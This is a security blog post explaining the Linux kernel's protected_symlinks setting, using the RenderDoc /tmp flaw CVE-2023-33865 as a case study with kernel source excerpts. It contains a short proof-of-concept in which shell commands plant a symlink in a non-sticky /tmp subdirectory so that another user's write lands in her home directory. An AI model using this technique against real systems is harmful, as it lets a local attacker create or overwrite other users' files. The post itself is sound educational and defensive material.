---
title: Today I Learned - Protected Symlinks
url: https://dfir.ch/posts/today_i_learned_protected_symlinks/
source: Over Security - Cybersecurity news aggregator
date: 2025-02-25
fetch_date: 2025-10-06T20:40:05.148558
---

# Today I Learned - Protected Symlinks

[Home](https://dfir.ch/)
[ ]

Menu

* [Home](/)
* [Posts](/posts/)
* [Talks](/talks/)
* [Tweets](/tweets/)
* |

LIGHT

DARK

# Today I Learned - Protected Symlinks

24 Feb 2025

**Table of Contents**

* [Introduction](#introduction)
* [Case Study](#case-study)
* [Proof of concept](#proof-of-concept)
* [Relevant Source Code](#relevant-source-code)
* [Conclusion](#conclusion)

## Introduction

*A long-standing class of security issues is the symlink-based time-of-check-time-of-use race, most commonly seen in world-writable directories like /tmp. The common method of exploitation of this flaw is to cross privilege boundaries when following a given symlink (i.e. a root process follows a symlink belonging to another user). For a likely incomplete list of hundreds of examples across the years, please see: <http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=/tmp>*. **Source:** [Sysctl Explorer](https://sysctl-explorer.net/fs/protected_symlinks/)

The `protected_symlinks` setting within the Linux Kernel helps prevent `TOCTOU` (time-of-check-time-of-use) vulnerabilities in privileged processes. Without this protection, a malicious user could trick a privileged process (such as a root-owned service) into following a symlink and overwriting or reading sensitive files. [0xdf](https://www.linkedin.com/in/0xdf/) showcases the “problem” with protected symlinks in his writeup on the HackTheBox machine [Bookworm](https://0xdf.gitlab.io/2024/01/20/htb-bookworm.html).

[Here](https://www.sudo.ws/security/advisories/sudoedit_selinux/) is another example, showcasing how `protected_symlinks` literally breaks a vulnerability in `Sudo`:

*A race condition exists whereby the invoking user could replace the temporary file with a symbolic link after the file has been edited but before `sudoedit` changes its owner back to the target user. Winning the race allows the user to set the owner of an arbitrary file to the target user. However, if the protected symlinks feature is supported by the kernel and `/proc/sys/fs/protected_symlinks` is set to 1 (the default on many systems), the attack will fail.*

## Case Study

As mentioned in the opening quote of this blog post, finding a relevant vulnerability is as simple as visiting the MITRE page and searching for CVEs with the keyword `/tmp`. During my (re-)search, I discovered `CVE-2023-33865`, where details were published on the [Full Disclosure Mailing List](https://seclists.org/fulldisclosure/2023/Jun/2):

**CVE-2023-33865, a symlink vulnerability in /tmp/RenderDoc**

As soon as `librenderdoc.so` is LD\_PRELOADed into the application to be debugged, its `library_loaded()` function:

* creates the directory `/tmp/RenderDoc`, or reuses it if it already exists, even if it does not belong to the user who runs RenderDoc (Alice, in this advisory);
* opens (and possibly creates) a log file of the form `/tmp/RenderDoc/RenderDoc_app_YYYY.MM.DD_hh.mm.ss.log`, and writes to it in append mode.

Consequently, a local attacker can create `/tmp/RenderDoc` before Alice runs RenderDoc and can populate this directory with numerous symlinks (of the form `/tmp/RenderDoc/RenderDoc_app_YYYY.MM.DD_hh.mm.ss.log`) that point to an arbitrary file in the filesystem; when Alice runs RenderDoc, this file will be created (if it does not exist already) and written to, with Alice’s privileges.

The original post includes exploit code, but letâs walk through the process by recreating and refining the steps.

## Proof of concept

Verify whether protected symlinks are enabled:

```
root@symlink:~# cat /proc/sys/fs/protected_symlinks
1
```

Acting as Thomas, we first create a new directory named `RenderDoc` under `/tmp`. Inside this directory, we then create a symbolic link pointing to a file in Sarah’s home directory (`/home/sarah/dfir.ch`):

```
thomas@symlink:/tmp$ mkdir RenderDoc
thomas@symlink:/tmp$ cd RenderDoc/
thomas@symlink:/tmp/RenderDoc$ ln -s /home/sarah/dfir.ch RenderDoc_app_2025.02.18_08.00.00.log
thomas@symlink:/tmp/RenderDoc$ ls -l RenderDoc_app_2025.02.18_08.00.00.log
lrwxrwxrwx 1 thomas thomas 19 Feb 18 06:43 RenderDoc_app_2025.02.18_08.00.00.log -> /home/sarah/dfir.ch
```

If Sarah now writes in the document `RenderDoc_app_2025.02.18_08.00.00.log`, the symbolic link is followed, and a file is created in her home directory:

```
sarah@symlink:~$ echo "DFIR rocks!" > /tmp/RenderDoc/RenderDoc_app_2025.02.18_08.00.00.log
sarah@symlink:~$ cat /home/sarah/dfir.ch
DFIR rocks!
sarah@symlink:~$
```

***Wait.. Haven’t you said it should prevent exactly this scenario?***

Well.. yes:

```
sarah@symlink:~$ echo "DFIR rocks!" > /tmp/RenderDoc_app_2025.02.18_08.00.00.log
bash: /tmp/RenderDoc_app_2025.02.18_08.00.00.log: Permission denied
```

*When set to â1â symlinks are permitted to be followed only when outside a sticky world-writable directory..* - **and because the sub-directory `RenderDoc` will not inherit the stick-bit from the `/tmp` directory, the protection will not work here.**

The `sudoedit` exploit discussed above will not work because the (malicious) symlink must be created inside `/var/tmp/`, and we will receive permission denied when we try to follow this symlink (same as in `/tmp`). So, in this scenario, the symlink protection is an effective protection.

## Relevant Source Code

To determine if this behavior is *by design*, we look at the [relevant code](https://github.com/torvalds/linux/blob/master/fs/namei.c#L1167) from the Linux repository on GitHub. First things first, if the system-wide symlink protection setting (`protected_symlinks`) is disabled, following the link is allowed immediately:

```
if (!sysctl_protected_symlinks)
    return 0;
```

If the owner of the symlink and the follower match, i.e. the same user, the action is allowed:

```
if (vfsuid_eq_kuid(vfsuid, current_fsuid()))
    return 0;
```

If the owner of the symlink and the parent directories matches, i.e. the same user, the action is allowed:

```
if (vfsuid_valid(nd->dir_vfsuid) && vfsuid_eq(nd->dir_vfsuid, vfsuid))
    return 0;
```

**If the parent directory is not sticky** and world-writable, the action is allowed. And here lies the problem. Because our created `RenderDoc` directory does not inherit the sticky-bit from the `/tmp` folder, the code does not see a (security) problem and follows the symlink, resulting in the created file in Sarah’s home directory.

```
if ((nd->dir_mode & (S_ISVTX|S_IWOTH)) != (S_ISVTX|S_IWOTH))
    return 0;
```

## Conclusion

The `protected_symlinks` feature in the Linux kernel is an essential safeguard against `TOCTOU` race conditions and symlink-based privilege escalation.

However, as demonstrated, it is not foolproofâspecific scenarios, such as symlinks within subdirectories that do not inherit the sticky bit, can still bypass this protection. Understanding how `protected_symlinks` works, including its limitations, is crucial for both system administrators and security researchers.

For enhanced system security, always ensure this feature is enabled and be aware of edge cases that may still pose risks. This blog post doesnât cover all the protections available, but others follow a similar approach:

* /proc/sys/fs/protected\_hardlinks
* /proc/sys/fs/protected\_fifos
* /proc/sys/fs/protected\_regular

Â© 2025 .
Powered by [Hugo blog awesome](https://github.com/hugo-sid/hugo-blog-awesome).